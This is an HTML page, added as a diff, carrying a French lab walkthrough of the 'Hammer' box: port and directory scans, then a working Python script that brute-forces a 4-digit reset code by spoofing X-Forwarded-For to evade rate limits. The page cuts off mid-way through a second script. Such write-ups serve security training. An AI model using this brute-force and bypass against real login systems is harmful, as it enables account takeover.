@@ -1,0 +1,836 @@
+<!DOCTYPE html>
+<html lang="fr-fr" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="
+  🔨 Hammer
+  
+  #
+  
+
+Hammer est une box de niveau moyen qui consiste à exploiter les vulnérabilités d&rsquo;un système d&rsquo;authentification. Après une brève énumération des ports, on se retrouve sur une page d&rsquo;authentification classique avec login/mot de passe et le lien pour réinitialiser le mot de passe. Nous n&rsquo;avons pas de comptes ni d&rsquo;email donc nous allons commencer à énumérer les dossiers possibles.
+
+  Reconnaissance
+  
+  #
+  
+
+
+  Port Enumeration
+  
+  #
+  
+
+nmap -sS -sV -p- hammer.thm
+Starting Nmap 7.80 ( https://nmap.org ) at 2025-11-23 20:00 GMT
+mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for hammer.thm (10.80.140.21)
+Host is up (0.0021s latency).
+Not shown: 65533 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.43 seconds
+
+  Directory Enumeration
+  
+  #
+  
+
+Dans le code source de l&rsquo;application, on voit un commentaire mentionnant que les dossiers respectent la nomenclature : &ldquo;hmr_NOMDOSSER&rdquo;.">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="//localhost:1313/docs/writeups/vm/collapsed/hammer/">
+  <meta property="og:site_name" content="@camillegr">
+  <meta property="og:title" content="Hammer">
+  <meta property="og:description" content="🔨 Hammer # Hammer est une box de niveau moyen qui consiste à exploiter les vulnérabilités d’un système d’authentification. Après une brève énumération des ports, on se retrouve sur une page d’authentification classique avec login/mot de passe et le lien pour réinitialiser le mot de passe. Nous n’avons pas de comptes ni d’email donc nous allons commencer à énumérer les dossiers possibles.
+Reconnaissance # Port Enumeration # nmap -sS -sV -p- hammer.thm Starting Nmap 7.80 ( https://nmap.org ) at 2025-11-23 20:00 GMT mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers Nmap scan report for hammer.thm (10.80.140.21) Host is up (0.0021s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) 1337/tcp open http Apache httpd 2.4.41 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.43 seconds Directory Enumeration # Dans le code source de l’application, on voit un commentaire mentionnant que les dossiers respectent la nomenclature : “hmr_NOMDOSSER”.">
+  <meta property="og:locale" content="fr_fr">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="docs">
+<title>Hammer | @camillegr</title>
+<link rel="icon" href="/favicon.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="//localhost:1313/docs/writeups/vm/collapsed/hammer/">
+<link rel="stylesheet" href="/book.min.bb3e87f07d36c204e64f36f7b234cbfca24038b4a3f644b253b84740bc8ac74b.css" integrity="sha256-uz6H8H02wgTmTzb3sjTL/KJAOLSj9kSyU7hHQLyKx0s=" crossorigin="anonymous">
+  <script defer src="/fuse.min.js"></script>
+  <script defer src="/en.search.min.90d94b57b0b3b02cf3a1affad34e88fe32c0b74b4fb192ed05465041e53256de.js" integrity="sha256-kNlLV7CzsCzzoa/6006I/jLAt0tPsZLtBUZQQeUyVt4=" crossorigin="anonymous"></script>
+<!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr" class="book-kind-page book-type-docs">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><span>@camillegr</span>
+  </a>
+</h2>
+
+
+<div class="book-search hidden">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-ad93f8b4ee98a57a6224ee06f39153b9" class="toggle"  />
+    <label for="section-ad93f8b4ee98a57a6224ee06f39153b9" class="flex">
+      <a role="button" class="flex-auto ">Projets Personnels</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/projets/collapsed/tofuzz/" class="">ToFuzz</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-72538655c7e4bb37bc80c6f43d7e4b3b" class="toggle" checked />
+    <label for="section-72538655c7e4bb37bc80c6f43d7e4b3b" class="flex">
+      <a href="/docs/writeups/" class="flex-auto ">Writeups</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-14ed21d169f82c1f4e9784c42f27b9c3" class="toggle"  />
+    <label for="section-14ed21d169f82c1f4e9784c42f27b9c3" class="flex">
+      <a href="/docs/writeups/rootmepro2025/" class="flex-auto ">CTF 2025 | Root-Me Pro x DGSE</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/writeups/rootmepro2025/collapsed/mission1/" class="">Mission 1 - IA</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/writeups/rootmepro2025/collapsed/mission2/" class="">Mission 2 - SOC</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/writeups/rootmepro2025/collapsed/mission3/" class="">Mission 3 - Forensic</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/writeups/rootmepro2025/collapsed/mission4/" class="">Mission 4 - Pentest</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/writeups/rootmepro2025/collapsed/mission5/" class="">Mission 5 - Mobile</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/writeups/rootmepro2025/collapsed/mission6/" class="">Mission 6 - OSINT</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-661913a3e27635165633fb2069bf836f" class="toggle" checked />
+    <label for="section-661913a3e27635165633fb2069bf836f" class="flex">
+      <a href="/docs/writeups/vm/" class="flex-auto ">Virtual Machines</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/writeups/vm/collapsed/hammer/" class="active">Hammer</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/writeups/vm/collapsed/mrrobot/" class="">Mr Robot</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/writeups/vm/collapsed/rootme/" class="">RootMe</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/writeups/vm/collapsed/wonderlands/" class="">Wonderlands</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <span>Divers</span>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/divers/blogs/" class="">Blogs</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+
+  </div>
+</aside>
+ 
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <h3>Hammer</h3>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#reconnaissance">Reconnaissance</a>
+      <ul>
+        <li><a href="#port-enumeration">Port Enumeration</a></li>
+        <li><a href="#directory-enumeration">Directory Enumeration</a></li>
+        <li><a href="#logs">Logs</a></li>
+      </ul>
+    </li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li><a href="#controunement-des-limitation">Controunement des limitation</a></li>
+        <li><a href="#réinitialisation-du-mot-de-passe">Réinitialisation du mot de passe</a></li>
+        <li><a href="#commandes-dadministration">Commandes d&rsquo;administration</a></li>
+        <li><a href="#local-enumération">Local Enumération</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#faille">Faille</a></li>
+    <li><a href="#exploit">Exploit</a></li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown book-article"><h1 id="-hammer">
+  🔨 Hammer
+  
+  <a class="anchor" href="#-hammer">#</a>
+  
+</h1>
+<p>Hammer est une box de niveau moyen qui consiste à exploiter les vulnérabilités d&rsquo;un système d&rsquo;authentification. Après une brève énumération des ports, on se retrouve sur une page d&rsquo;authentification classique avec login/mot de passe et le lien pour réinitialiser le mot de passe. Nous n&rsquo;avons pas de comptes ni d&rsquo;email donc nous allons commencer à énumérer les dossiers possibles.</p>
+<h2 id="reconnaissance">
+  Reconnaissance
+  
+  <a class="anchor" href="#reconnaissance">#</a>
+  
+</h2>
+<h3 id="port-enumeration">
+  Port Enumeration
+  
+  <a class="anchor" href="#port-enumeration">#</a>
+  
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sS -sV -p- hammer.thm
+</span></span><span style="display:flex;"><span>Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-11-23 20:00 GMT
+</span></span><span style="display:flex;"><span>mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
+</span></span><span style="display:flex;"><span>mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> hammer.thm <span style="color:#f92672">(</span>10.80.140.21<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.0021s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed ports
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1337/tcp open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 15.43 seconds
+</span></span></code></pre></div><h3 id="directory-enumeration">
+  Directory Enumeration
+  
+  <a class="anchor" href="#directory-enumeration">#</a>
+  
+</h3>
+<p>Dans le code source de l&rsquo;application, on voit un commentaire mentionnant que les dossiers respectent la nomenclature : &ldquo;hmr_NOMDOSSER&rdquo;.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://hammer.thm:1337/hmr_FUZZ
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
+</span></span><span style="display:flex;"><span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
+</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       v1.3.1
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> :: Method           : GET
+</span></span><span style="display:flex;"><span> :: URL              : http://hammer.thm:1337/hmr_FUZZ
+</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+</span></span><span style="display:flex;"><span> :: Follow redirects : false
+</span></span><span style="display:flex;"><span> :: Calibration      : false
+</span></span><span style="display:flex;"><span> :: Timeout          : <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span> :: Threads          : <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>images                  <span style="color:#f92672">[</span>Status: 301, Size: 320, Words: 20, Lines: 10<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>css                     <span style="color:#f92672">[</span>Status: 301, Size: 317, Words: 20, Lines: 10<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>js                      <span style="color:#f92672">[</span>Status: 301, Size: 316, Words: 20, Lines: 10<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>logs                    <span style="color:#f92672">[</span>Status: 301, Size: 318, Words: 20, Lines: 10<span style="color:#f92672">]</span>
+</span></span></code></pre></div><h3 id="logs">
+  Logs
+  
+  <a class="anchor" href="#logs">#</a>
+  
+</h3>
+<p>Dans le dossier logs on trouve :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>Mon Aug <span style="color:#ae81ff">19</span> 12:00:01.123456 2024<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>core:error<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>pid 12345:tid 139999999999999<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>client 192.168.1.10:56832<span style="color:#f92672">]</span> AH00124: Request exceeded the limit of <span style="color:#ae81ff">10</span> internal redirects due to probable configuration error. Use <span style="color:#e6db74">&#39;LimitInternalRecursion&#39;</span> to increase the limit <span style="color:#66d9ef">if</span> necessary. Use <span style="color:#e6db74">&#39;LogLevel debug&#39;</span> to get a backtrace.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Mon Aug <span style="color:#ae81ff">19</span> 12:01:22.987654 2024<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>authz_core:error<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>pid 12346:tid 139999999999998<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>client 192.168.1.15:45918<span style="color:#f92672">]</span> AH01630: client denied by server configuration: /var/www/html/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Mon Aug <span style="color:#ae81ff">19</span> 12:02:34.876543 2024<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>authz_core:error<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>pid 12347:tid 139999999999997<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>client 192.168.1.12:37210<span style="color:#f92672">]</span> AH01631: user tester@hammer.thm: authentication failure <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#34;/restricted-area&#34;</span>: Password Mismatch
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Mon Aug <span style="color:#ae81ff">19</span> 12:03:45.765432 2024<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>authz_core:error<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>pid 12348:tid 139999999999996<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>client 192.168.1.20:37254<span style="color:#f92672">]</span> AH01627: client denied by server configuration: /etc/shadow
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Mon Aug <span style="color:#ae81ff">19</span> 12:04:56.654321 2024<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>core:error<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>pid 12349:tid 139999999999995<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>client 192.168.1.22:38100<span style="color:#f92672">]</span> AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/protected
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Mon Aug <span style="color:#ae81ff">19</span> 12:05:07.543210 2024<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>authz_core:error<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>pid 12350:tid 139999999999994<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>client 192.168.1.25:46234<span style="color:#f92672">]</span> AH01627: client denied by server configuration: /home/hammerthm/test.php
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Mon Aug <span style="color:#ae81ff">19</span> 12:06:18.432109 2024<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>authz_core:error<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>pid 12351:tid 139999999999993<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>client 192.168.1.30:40232<span style="color:#f92672">]</span> AH01617: user tester@hammer.thm: authentication failure <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#34;/admin-login&#34;</span>: Invalid email address
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Mon Aug <span style="color:#ae81ff">19</span> 12:07:29.321098 2024<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>core:error<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>pid 12352:tid 139999999999992<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>client 192.168.1.35:42310<span style="color:#f92672">]</span> AH00124: Request exceeded the limit of <span style="color:#ae81ff">10</span> internal redirects due to probable configuration error. Use <span style="color:#e6db74">&#39;LimitInternalRecursion&#39;</span> to increase the limit <span style="color:#66d9ef">if</span> necessary. Use <span style="color:#e6db74">&#39;LogLevel debug&#39;</span> to get a backtrace.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Mon Aug <span style="color:#ae81ff">19</span> 12:09:51.109876 2024<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>core:error<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>pid 12354:tid 139999999999990<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>client 192.168.1.50:45998<span style="color:#f92672">]</span> AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/locked-down
+</span></span></code></pre></div><p>On apprend donc :</p>
+<ul>
+<li>Qu&rsquo;il y a un utilisateur ayant pour mail : <a href="mailto:tester@hammer.thm">tester@hammer.thm</a></li>
+<li>l&rsquo;application a pour contexte d&rsquo;execution le dossier /var/www/html</li>
+</ul>
+<h2 id="exploitation">
+  Exploitation
+  
+  <a class="anchor" href="#exploitation">#</a>
+  
+</h2>
+<p>On observe que la fonctionnalité de réinitialisation du mot de passe utilise un rate limit. on va automatiser le brute-force du reset de mot de passe (l’envoie du code pin à 4 digits) et essayer de contourner la limitation.</p>
+<h3 id="controunement-des-limitation">
+  Controunement des limitation
+  
+  <a class="anchor" href="#controunement-des-limitation">#</a>
+  
+</h3>
+<p>Pour contourner le Send-Rate-Limit, on essai ces différentes options :</p>
+<ul>
+<li><strong>Parameter Pollution</strong> : KO —&gt; Impossible d’élever la limite ou alors de définir le recovery_code à la main</li>
+<li><strong>Changement de User-Agent</strong> : KO —&gt; La limite reste</li>
+<li><strong>Modification de la casse</strong> : KO —&gt; erreur Apache</li>
+<li><strong>X-Forwarded-For</strong> : OK —&gt; Bypass : on arrive à faire un nombre illimité de requêtes</li>
+</ul>
+<h3 id="réinitialisation-du-mot-de-passe">
+  Réinitialisation du mot de passe
+  
+  <a class="anchor" href="#r%c3%a9initialisation-du-mot-de-passe">#</a>
+  
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!python3 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>import requests, sys, re, time
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> requests.Session<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>NEW_PASS<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password123&#34;</span>
+</span></span><span style="display:flex;"><span>URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://hammer.thm:1337/reset_password.php&#34;</span>
+</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> <span style="color:#f92672">{</span> <span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>, <span style="color:#e6db74">&#34;Rate-Limit-Pending&#34;</span>:<span style="color:#e6db74">&#34;10000&#34;</span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>s_code<span style="color:#f92672">=</span><span style="color:#ae81ff">180</span>
+</span></span><span style="display:flex;"><span>delay<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s.get<span style="color:#f92672">(</span>URL<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>primo <span style="color:#f92672">=</span> s.post<span style="color:#f92672">(</span>URL, data<span style="color:#f92672">={</span><span style="color:#e6db74">&#34;email&#34;</span>:<span style="color:#e6db74">&#39;tester@hammer.thm&#39;</span><span style="color:#f92672">}</span>, headers<span style="color:#f92672">=</span>headers<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>print<span style="color:#f92672">(</span>f<span style="color:#e6db74">&#34;{primo.headers}&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>print<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;#&#39;</span>*20<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i in <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;%04d&#34;</span> % x <span style="color:#66d9ef">for</span> x in range<span style="color:#f92672">(</span>10000<span style="color:#f92672">)]</span> :
+</span></span><span style="display:flex;"><span>    datas<span style="color:#f92672">={</span><span style="color:#e6db74">&#34;recovery_code&#34;</span>:i,<span style="color:#e6db74">&#34;s&#34;</span>:s_code<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    headers<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;User-Agent&#34;</span><span style="color:#f92672">]=</span>f<span style="color:#e6db74">&#34;Test{i}&#34;</span>
+</span></span><span style="display:flex;"><span>    headers<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;X-Forwarded-For&#34;</span><span style="color:#f92672">]=</span>f<span style="color:#e6db74">&#34;0.0.0.{i}&#34;</span>
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> s.post<span style="color:#f92672">(</span>URL, data<span style="color:#f92672">=</span>datas, headers<span style="color:#f92672">=</span>headers<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    print<span style="color:#f92672">(</span>f<span style="color:#e6db74">&#34;CODE {i} (s={s_code}) : HTTP {r.status_code} &#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#    print(r.text)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> not <span style="color:#e6db74">&#34;Invalid or expired&#34;</span> in r.text :
+</span></span><span style="display:flex;"><span>        print <span style="color:#f92672">(</span>f<span style="color:#e6db74">&#34;[!] Code trouvé : {i}&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        break;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># your code in 180 seconds</span>
+</span></span><span style="display:flex;"><span>    s_code <span style="color:#f92672">=</span> int<span style="color:#f92672">(</span>re.search<span style="color:#f92672">(</span>r<span style="color:#e6db74">&#39;your code in (\d+) seconds&#39;</span>, r.text<span style="color:#f92672">)</span>.group<span style="color:#f92672">(</span>1<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>    time.sleep<span style="color:#f92672">(</span>delay<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#    s_code=s_code-1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>new_pass_datas<span style="color:#f92672">={</span><span style="color:#e6db74">&#34;new_password&#34;</span>:f<span style="color:#e6db74">&#34;{NEW_PASS}&#34;</span>,<span style="color:#e6db74">&#34;confirm_password&#34;</span>:f<span style="color:#e6db74">&#34;{NEW_PASS}&#34;</span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>final_req <span style="color:#f92672">=</span> s.post<span style="color:#f92672">(</span>URL, data<span style="color:#f92672">=</span>new_pass_datas, headers<span style="color:#f92672">=</span>headers<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print<span style="color:#f92672">(</span>f<span style="color:#e6db74">&#34;[*] Changement de mot de passe pour {NEW_PASS}&#34;</span><span style="color:#f92672">)</span>
+</span></span></code></pre></div><h3 id="commandes-dadministration">
+  Commandes d&rsquo;administration
+  
+  <a class="anchor" href="#commandes-dadministration">#</a>
+  
+</h3>
+<p>Après la connexion, on se retrouve sur une page web nous permettant d&rsquo;exécuter des commandes bash.</p>
+<p>On s’aperçoit qu’à part la commande ls, il n’y a pas beaucoup de commandes possible. Nous allons donc essayer de les énumérer. On peut automatiser l’exécution des commandes :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!python3 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>import requests, sys, re, time
+</span></span><span style="display:flex;"><span>import urllib.parse
+</span></span><span style="display:flex;"><span>import argparse
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>parser <span style="color:#f92672">=</span> argparse.ArgumentParser<span style="color:#f92672">()</span>
